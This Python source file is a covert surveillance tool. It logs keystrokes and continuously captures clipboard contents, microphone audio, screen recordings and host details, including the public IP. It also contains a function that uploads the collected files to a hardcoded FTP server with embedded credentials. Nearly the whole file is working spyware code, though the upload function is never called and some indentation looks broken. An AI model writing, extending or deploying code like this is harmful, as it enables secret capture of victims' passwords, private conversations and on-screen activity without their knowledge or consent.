import pynput
import datetime
import threading
import socket
import platform
import requests
import pyperclip
import pyaudio
import wave
import cv2
import pyautogui
import os
import fileinput
import numpy as np
from requests import get 
from ftplib import FTP 
from scipy.io.wavfile import read, write
from pynput.keyboard import Key, Listener
from ftplib import FTP 

WAV_FILENAME = "soundrec.wav"
SCREEN_RECORDING_MP4_FILENAME = "screenrec.mp4"
MACHINE_INFO_FILE = "machineinfo.text"
LOG_FILE = "keylogs.text"
READABLE_LOG_FILE = "readablelogs.text"
CLIPBOARD_HISTORY_FILE = "clipboardhistory.text"
SERVER_ADDRESS = "192.168.1.65"
SERVER_USERNMAE = "Aly Muhammad Aly"
SERVER_PASSWORD = "alyaly"
SCREEN_RECORDING_FPS = 3
SCREEN_RECORDING_SECONDS = 60
WEBCAM_RECORDING_SECONDS = 60
MP4_FOURCC = 1983148141
SCREEN_RECORDING_SIZE = (2560, 1600) 
SENDING_SPEED_IN_BYTES = 1024
SOUND_FORMAT = pyaudio.paInt16
CHANNELS = 1
SAMPLE_RATE = 44100
SOUND_RECORD_SECONDS = 60
SERVER_PORT = 2121


def press_keys(key):
	keys = []
	keys.append(key)
	current_date_time = datetime.datetime.now()
	write_readable_file(keys, current_date_time)
	write_log_file(keys, current_date_time)
	keys  = []

def write_log_file(keys, current_date_time):
	with open(LOG_FILE, "a") as file:
		for key in keys:
			file.write(str(key))
			file.write(str(current_date_time))
			file.write("\n")

def write_readable_file(keys, date_time):
	with open(READABLE_LOG_FILE, "a") as file:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				file.write(" ")
				file.write(str(date_time))
				file.write('\n')
			elif k.find("Key") == -1:
				file.write(k)

def write_machine_info_file():
	with open(MACHINE_INFO_FILE, "a") as file:
		file.write("Host name: %s" %socket.gethostname())
		file.write("\n")
		file.write("IP address: %s" %socket.gethostbyname(socket.gethostname()))
		file.write("\n")
		file.write("Processor type: %s" %platform.processor())
		file.write("\n")
		file.write("System type: %s" %platform.system())
		file.write("\n")
		file.write("Machine type: %s" %platform.machine())
		file.write("\n")
		file.write("Machine version: %s" %platform.version())
		file.write("\n")
		file.write("public IP: %s" %get('https://api.ipify.org').text)

def get_clipboard_history():
	clipboard_history = ""
	open(CLIPBOARD_HISTORY_FILE, "w")
	while True:
		if pyperclip.paste() == clipboard_history:
 			print("nothing new")
 		else:
 			with open(CLIPBOARD_HISTORY_FILE, "a") as file:
 				file.write(pyperclip.paste())
 				file.write(str(pyperclip.paste()))
 				file.write("\n")
 			clipboard_history = pyperclip.paste()

def record_sound():
	while True:
		my_pyaudio = pyaudio.PyAudio()
		stream = my_pyaudio.open(format=SOUND_FORMAT,channels=CHANNELS,rate=SAMPLE_RATE,
								 input=True,output=True,frames_per_buffer=SENDING_SPEED_IN_BYTES)
		frames = []
		print("Recording...")
		for i in range(int(SAMPLE_RATE / SENDING_SPEED_IN_BYTES * SOUND_RECORD_SECONDS)):
			data = stream.read(SENDING_SPEED_IN_BYTES)
			frames.append(data)
		print("Finished recording.")
		stream.stop_stream()
		stream.close()
		my_pyaudio.terminate()

		# Generating an audio (wav) file.
		wave_file = wave.open(WAV_FILENAME, "wb")
		wave_file.setnchannels(CHANNELS)
		wave_file.setsampwidth(my_pyaudio.get_sample_size(SOUND_FORMAT))
		wave_file.setframerate(SAMPLE_RATE)
		wave_file.writeframes(b"".join(frames))
		wave_file.close()

def record_screen():
	file_number = 1 
	while True:
		video_file = cv2.VideoWriter(SCREEN_RECORDING_MP4_FILENAME, MP4_FOURCC,
									 SCREEN_RECORDING_FPS,SCREEN_RECORDING_SIZE)
		for i in range(int(SCREEN_RECORDING_FPS * SCREEN_RECORDING_SECONDS)):
			screenshot = pyautogui.screenshot()
			frame = np.array(screenshot)
			frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
			video_file.write(frame)
		cv2.destroyAllWindows()
		video_file.release()

def send_file_via_ftp_server(file_name):
	# Creating an FTP instance and connecting to the server.
	ftp = FTP()
	ftp.set_debuglevel(2)
	ftp.connect(SERVER_ADDRESS, SERVER_PORT) 
	ftp.login(SERVER_USERNMAE,SERVER_PASSWORD)

	# Sending files using Storbinary method.
	with open(file_name, 'rb') as file:
		ftp.storbinary('STOR %s' % os.path.basename(file_name), file, SENDING_SPEED_IN_BYTES)

def main():
	machine_info = threading.Thread(target=write_machine_info_file)
	machine_info.start()
	clipboard_history = threading.Thread(target=get_clipboard_history)
	clipboard_history.start()
	sound_recording = threading.Thread(target=record_sound)
	sound_recording.start()
	screen_recording = threading.Thread(target=record_screen)
	screen_recording.start()
	with Listener(on_press=press_keys) as listener:
		listener.join()

if __name__ == '__main__':
	main()